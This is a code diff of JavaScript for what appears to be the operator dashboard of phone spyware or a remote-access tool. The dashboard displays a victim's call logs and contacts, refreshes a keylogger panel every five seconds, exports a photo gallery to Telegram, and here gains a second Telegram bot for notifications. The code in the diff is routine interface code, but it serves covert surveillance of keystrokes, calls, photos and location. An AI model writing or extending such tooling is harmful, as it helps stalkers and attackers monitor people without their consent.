-        else conContainer.innerHTML = contacts.map(contact => `
-            <div style="background:#1a1214; border:1px solid #2d1d20; border-radius:8px; padding:10px; margin-bottom:6px;">
-                ${escapeHtml(contact.name)} — ${escapeHtml(contact.number)}
-            </div>
-        `).join("");
-    } catch (e) {
-        document.getElementById("callLogsList").innerHTML = "Error loading call logs.";
-        document.getElementById("contactsList").innerHTML = "Error loading contacts.";
-    }
-}
-
-// ================== TELEGRAM SETTINGS ==================
+// ==================== TELEGRAM SETTINGS ====================
 async function loadTelegramSettings() {
     const res = await fetch('/api/telegram/settings');
     const data = await res.json();
     document.getElementById("tgBotToken").value = data.botToken || '';
     document.getElementById("tgChatId").value = data.chatId || '';
+    document.getElementById("tgNotifBotToken").value = data.notifBotToken || '';
+    document.getElementById("tgNotifChatId").value = data.notifChatId || '';
 }
 
 async function saveTelegramSettings() {
     const botToken = document.getElementById("tgBotToken").value.trim();
     const chatId = document.getElementById("tgChatId").value.trim();
-    if (!botToken || !chatId) return alert('Bot token and chat ID required.');
+    const notifBotToken = document.getElementById("tgNotifBotToken").value.trim();
+    const notifChatId = document.getElementById("tgNotifChatId").value.trim();
     const res = await fetch('/api/telegram/settings', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ botToken, chatId })
+        body: JSON.stringify({ botToken, chatId, notifBotToken, notifChatId })
     });
     if (res.ok) alert('Settings saved.');
     else alert('Failed to save settings.');
@@ -1456,14 +1590,14 @@ async function exportGalleryToTelegram() {
     }
 }
 
-// ================== AUTO REFRESH (5 SECONDS) ==================
+// ==================== AUTO REFRESH ====================
 setInterval(() => {
     if (document.getElementById("keylogPanel").style.display === "block") {
         refreshKeylog();
     }
 }, 5000);
 
-// ================== INIT ==================
+// ==================== INIT ====================
 async function init() {
     await loadFeaturePermissions();
     initMap();
